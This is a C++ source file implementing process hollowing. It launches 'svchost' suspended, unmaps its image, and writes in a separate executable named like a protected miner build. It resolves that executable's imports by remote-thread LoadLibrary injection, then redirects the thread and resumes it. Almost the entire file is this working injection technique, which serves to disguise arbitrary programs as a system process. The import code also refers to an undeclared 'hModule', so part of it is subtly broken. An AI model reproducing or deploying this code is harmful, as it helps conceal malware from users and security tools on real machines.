// ProcessHollowing.cpp : Defines the entry point for the console application.

#include "stdafx.h"
#include <windows.h>
#include <cstdint>
#include <algorithm>
#include <cctype>
#include <string>
#include <unordered_map>
#include <vector>
#include <TlHelp32.h>
#include "internals.h"
#include "pe.h"

namespace
{

std::string ToLower(std::string value)
{
        std::transform(value.begin(), value.end(), value.begin(), [](unsigned char c) {
                return static_cast<char>(std::tolower(c));
        });

        return value;
}

HMODULE GetRemoteModuleHandleCaseInsensitive(HANDLE hProcess, const std::string& moduleName)
{
        DWORD processId = GetProcessId(hProcess);
        if (!processId)
        {
                return nullptr;
        }

        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, processId);
        if (hSnapshot == INVALID_HANDLE_VALUE)
        {
                return nullptr;
        }

        MODULEENTRY32 moduleEntry = {0};
        moduleEntry.dwSize = sizeof(moduleEntry);

        std::string needle = ToLower(moduleName);

        BOOL hasModule = Module32First(hSnapshot, &moduleEntry);
        while (hasModule)
        {
                std::string candidate = ToLower(moduleEntry.szModule);
                if (candidate == needle)
                {
                        CloseHandle(hSnapshot);
                        return moduleEntry.hModule;
                }

                hasModule = Module32Next(hSnapshot, &moduleEntry);
        }

        CloseHandle(hSnapshot);
        return nullptr;
}

bool EnsureRemoteModuleLoaded(
        HANDLE hProcess,
        const std::string& moduleName,
        HMODULE& hRemoteModule)
{
        hRemoteModule = GetRemoteModuleHandleCaseInsensitive(hProcess, moduleName);
        if (hRemoteModule)
        {
                return true;
        }

        SIZE_T moduleNameSize = moduleName.size() + 1;
        LPVOID pRemoteString = VirtualAllocEx(
                hProcess,
                0,
                moduleNameSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE);

        if (!pRemoteString)
        {
                return false;
        }

        if (!WriteProcessMemory(
                        hProcess,
                        pRemoteString,
                        moduleName.c_str(),
                        moduleNameSize,
                        0))
        {
                VirtualFreeEx(hProcess, pRemoteString, 0, MEM_RELEASE);
                return false;
        }

        HANDLE hThread = CreateRemoteThread(
                hProcess,
                0,
                0,
                reinterpret_cast<LPTHREAD_START_ROUTINE>(LoadLibraryA),
                pRemoteString,
                0,
                0);

        if (!hThread)
        {
                VirtualFreeEx(hProcess, pRemoteString, 0, MEM_RELEASE);
                return false;
        }

        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, pRemoteString, 0, MEM_RELEASE);

        hRemoteModule = GetRemoteModuleHandleCaseInsensitive(hProcess, moduleName);
        return hRemoteModule != nullptr;
}

bool ResolveImports(
        HANDLE hProcess,
        UINT_PTR remoteBase,
        BYTE* pLocalImage,
        PIMAGE_NT_HEADERS_T pSourceHeaders)
{
        std::unordered_map<std::string, HMODULE> remoteModuleCache;
        std::unordered_map<std::string, HMODULE> localModuleCache;

        const auto& importDirectory =
                pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

        if (!importDirectory.VirtualAddress || !importDirectory.Size)
        {
                return true;
        }

        auto pImportDescriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(
                pLocalImage + importDirectory.VirtualAddress);

        while (pImportDescriptor->Name)
        {
                auto pModuleName = reinterpret_cast<char*>(pLocalImage + pImportDescriptor->Name);
                std::string moduleName = pModuleName;
                std::string lookupName = ToLower(moduleName);

                HMODULE hLocalModule = nullptr;
                auto localIt = localModuleCache.find(lookupName);
                if (localIt != localModuleCache.end())
                {
                        hLocalModule = localIt->second;
                }
                else
                {
                        hLocalModule = GetModuleHandleA(moduleName.c_str());
                        if (!hLocalModule)
                        {
                                hLocalModule = LoadLibraryA(moduleName.c_str());
                        }

                        if (hLocalModule)
                        {
                                localModuleCache.emplace(lookupName, hLocalModule);
                        }
                }

                if (!hLocalModule)
                {
                        printf("Failed to load dependency %s\r\n", pModuleName);
                        return false;
                }

                HMODULE hRemoteModule = nullptr;
                auto remoteIt = remoteModuleCache.find(lookupName);
                if (remoteIt != remoteModuleCache.end())
                {
                        hRemoteModule = remoteIt->second;
                }
                else if (EnsureRemoteModuleLoaded(hProcess, moduleName, hRemoteModule))
                {
                        remoteModuleCache.emplace(lookupName, hRemoteModule);
                }

                if (!hRemoteModule)
                {
                        printf("Failed to load remote dependency %s\r\n", pModuleName);
                        return false;
                }

                auto pLookupThunk = reinterpret_cast<PIMAGE_THUNK_DATA_T>(
                        pLocalImage + (pImportDescriptor->OriginalFirstThunk
                                ? pImportDescriptor->OriginalFirstThunk
                                : pImportDescriptor->FirstThunk));

                for (SIZE_T thunkIndex = 0; pLookupThunk->u1.AddressOfData; ++pLookupThunk, ++thunkIndex)
                {
                        FARPROC pFunction = nullptr;

#ifdef _WIN64
                        if (IMAGE_SNAP_BY_ORDINAL64(pLookupThunk->u1.Ordinal))
                        {
                                pFunction = GetProcAddress(
                                        hModule,
                                        reinterpret_cast<LPCSTR>(IMAGE_ORDINAL64(pLookupThunk->u1.Ordinal)));
                        }
                        else
#else
                        if (IMAGE_SNAP_BY_ORDINAL32(pLookupThunk->u1.Ordinal))
                        {
                                pFunction = GetProcAddress(
                                        hModule,
                                        reinterpret_cast<LPCSTR>(IMAGE_ORDINAL32(pLookupThunk->u1.Ordinal)));
                        }
                        else
#endif
                        {
                                auto pImportByName = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(
                                        pLocalImage + static_cast<size_t>(pLookupThunk->u1.AddressOfData));

                                pFunction = GetProcAddress(hModule, reinterpret_cast<LPCSTR>(pImportByName->Name));
                        }

                        if (!pFunction)
                        {
                                printf("Failed to resolve import for %s\r\n", pModuleName);
                                return false;
                        }

                        ULONG_PTR functionAddressOffset =
                                reinterpret_cast<ULONG_PTR>(pFunction) -
                                reinterpret_cast<ULONG_PTR>(hLocalModule);
                        ULONG_PTR remoteFunctionAddress =
                                reinterpret_cast<ULONG_PTR>(hRemoteModule) + functionAddressOffset;
                        SIZE_T bytesWritten = 0;
                        auto pRemoteThunk = reinterpret_cast<PVOID>(
                                remoteBase + pImportDescriptor->FirstThunk +
                                thunkIndex * sizeof(ULONG_PTR));

                        if (!WriteProcessMemory(
                                    hProcess,
                                    pRemoteThunk,
                                    &remoteFunctionAddress,
                                    sizeof(remoteFunctionAddress),
                                    &bytesWritten) ||
                                bytesWritten != sizeof(remoteFunctionAddress))
                        {
                                printf("Failed to write import thunk for %s\r\n", pModuleName);
                                return false;
                        }
                }

                ++pImportDescriptor;
        }

        return true;
}

} // namespace

void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
{

printf("Creating process\r\n");

STARTUPINFOA startupInfo;
ZeroMemory(&startupInfo, sizeof(startupInfo));
startupInfo.cb = sizeof(startupInfo);
PROCESS_INFORMATION processInfo;
ZeroMemory(&processInfo, sizeof(processInfo));

CreateProcessA
(
0,
pDestCmdLine,
0,
		0, 
		0, 
		CREATE_SUSPENDED, 
		0, 
		0, 
&startupInfo,
&processInfo
);

if (!processInfo.hProcess)
{
printf("Error creating process\r\n");

return;
}

PPEB pPEB = ReadRemotePEB(processInfo.hProcess);

ReadRemoteImage(processInfo.hProcess, pPEB->ImageBaseAddress);

printf("Opening source image\r\n");

	HANDLE hFile = CreateFileA
	(
		pSourceFile,
		GENERIC_READ, 
		0, 
		0, 
		OPEN_ALWAYS, 
		0, 
		0
	);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Error opening %s\r\n", pSourceFile);
		return;
	}

DWORD dwSize = GetFileSize(hFile, 0);
std::vector<BYTE> fileBuffer(dwSize);
DWORD dwBytesRead = 0;
ReadFile(hFile, fileBuffer.data(), dwSize, &dwBytesRead, 0);
CloseHandle(hFile);
PLOADED_IMAGE_EX pSourceImage = GetLoadedImage(reinterpret_cast<uintptr_t>(fileBuffer.data()));

PIMAGE_NT_HEADERS_T pSourceHeaders = GetNTHeaders(reinterpret_cast<uintptr_t>(fileBuffer.data()));

	printf("Unmapping destination section\r\n");

	HMODULE hNTDLL = GetModuleHandleA("ntdll");

	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

	_NtUnmapViewOfSection NtUnmapViewOfSection =
		(_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

DWORD dwResult = NtUnmapViewOfSection
(
processInfo.hProcess,
pPEB->ImageBaseAddress
);

	if (dwResult)
	{
		printf("Error unmapping section\r\n");
		return;
	}

	printf("Allocating memory\r\n");

PVOID pRemoteImage = VirtualAllocEx
(
processInfo.hProcess,
pPEB->ImageBaseAddress,
static_cast<SIZE_T>(pSourceHeaders->OptionalHeader.SizeOfImage),
MEM_COMMIT | MEM_RESERVE,
PAGE_EXECUTE_READWRITE
);

if (!pRemoteImage)
{
printf("VirtualAllocEx call failed\r\n");
return;
}

UINT_PTR remoteBase = reinterpret_cast<UINT_PTR>(pPEB->ImageBaseAddress);
UINT_PTR sourceBase = static_cast<UINT_PTR>(pSourceHeaders->OptionalHeader.ImageBase);
LONG_PTR dwDelta = static_cast<LONG_PTR>(remoteBase) - static_cast<LONG_PTR>(sourceBase);

printf
(
"Source image base: 0x%p\r\n"
"Destination image base: 0x%p\r\n",
reinterpret_cast<PVOID>(sourceBase),
pPEB->ImageBaseAddress
);

printf("Relocation delta: 0x%Ix\r\n", dwDelta);

pSourceHeaders->OptionalHeader.ImageBase = static_cast<decltype(pSourceHeaders->OptionalHeader.ImageBase)>(remoteBase);

printf("Writing headers\r\n");

if (!WriteProcessMemory
(
processInfo.hProcess,
pPEB->ImageBaseAddress,
fileBuffer.data(),
static_cast<SIZE_T>(pSourceHeaders->OptionalHeader.SizeOfHeaders),
0
))
{
printf("Error writing process memory\r\n");

return;
}

for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
{
if (!pSourceImage->Sections[x].PointerToRawData)
continue;

PVOID pSectionDestination =
reinterpret_cast<PVOID>(remoteBase + pSourceImage->Sections[x].VirtualAddress);

printf("Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);

if (!WriteProcessMemory
(
processInfo.hProcess,
pSectionDestination,
&fileBuffer[pSourceImage->Sections[x].PointerToRawData],
pSourceImage->Sections[x].SizeOfRawData,
0
))
{
printf ("Error writing process memory\r\n");
return;
}
}

if (dwDelta)
for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
{
char* pSectionName = ".reloc";

			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;

			printf("Rebasing image\r\n");

			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;

			IMAGE_DATA_DIRECTORY relocData = 
				pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			while (dwOffset < relocData.Size)
			{
PBASE_RELOCATION_BLOCK pBlockheader =
reinterpret_cast<PBASE_RELOCATION_BLOCK>(&fileBuffer[dwRelocAddr + dwOffset]);

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);

				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

PBASE_RELOCATION_ENTRY pBlocks =
reinterpret_cast<PBASE_RELOCATION_ENTRY>(&fileBuffer[dwRelocAddr + dwOffset]);

				for (DWORD y = 0; y <  dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[y].Type == 0)
						continue;

DWORD dwFieldAddress =
pBlockheader->PageAddress + pBlocks[y].Offset;

if (pBlocks[y].Type != IMAGE_REL_BASED_HIGHLOW &&
pBlocks[y].Type != IMAGE_REL_BASED_DIR64)
{
continue;
}

ULONG_PTR dwBuffer = 0;
ReadProcessMemory
(
processInfo.hProcess,
reinterpret_cast<PVOID>(remoteBase + dwFieldAddress),
&dwBuffer,
sizeof(dwBuffer),
0
);

dwBuffer = static_cast<ULONG_PTR>(static_cast<LONGLONG>(dwBuffer) + dwDelta);

BOOL bSuccess = WriteProcessMemory
(
processInfo.hProcess,
reinterpret_cast<PVOID>(remoteBase + dwFieldAddress),
&dwBuffer,
sizeof(dwBuffer),
0
);

if (!bSuccess)
{
						printf("Error writing memory\r\n");
						continue;
					}
				}
			}

                        break;
                }

if (!ResolveImports(processInfo.hProcess, remoteBase, fileBuffer.data(), pSourceHeaders))
{
        printf("Failed to resolve imports\r\n");
        return;
}

DWORD dwBreakpoint = 0xCC;

UINT_PTR dwEntrypoint = remoteBase +
pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

#ifdef WRITE_BP
                printf("Writing breakpoint\r\n");

                if (!WriteProcessMemory
                        (
                        processInfo.hProcess,
                        (PVOID)dwEntrypoint,
                        &dwBreakpoint,
                        4,
                        0
                        ))
		{
			printf("Error writing breakpoint\r\n");
			return;
		}
#endif

CONTEXT context = {0};
#ifdef _WIN64
context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
#else
context.ContextFlags = CONTEXT_INTEGER;
#endif

printf("Getting thread context\r\n");

if (!GetThreadContext(processInfo.hThread, &context))
{
printf("Error getting context\r\n");
return;
}

#ifdef _WIN64
context.Rip = dwEntrypoint;
#else
context.Eax = static_cast<DWORD>(dwEntrypoint);
#endif

printf("Setting thread context\r\n");

if (!SetThreadContext(processInfo.hThread, &context))
{
printf("Error setting context\r\n");
return;
}

printf("Resuming thread\r\n");

if (!ResumeThread(processInfo.hThread))
{
printf("Error resuming thread\r\n");
return;
}

		printf("Process hollowing complete\r\n");
}

int _tmain(int argc, _TCHAR* argv[])
{
	char* pPath = new char[MAX_PATH];
	GetModuleFileNameA(0, pPath, MAX_PATH);
	pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
	strcat(pPath, "xxxxxrapido-x86_64-SSE4-AVX2_protected.exe");
	
	CreateHollowedProcess
	(
		"svchost", 
		pPath
	);

	system("pause");

	return 0;
}
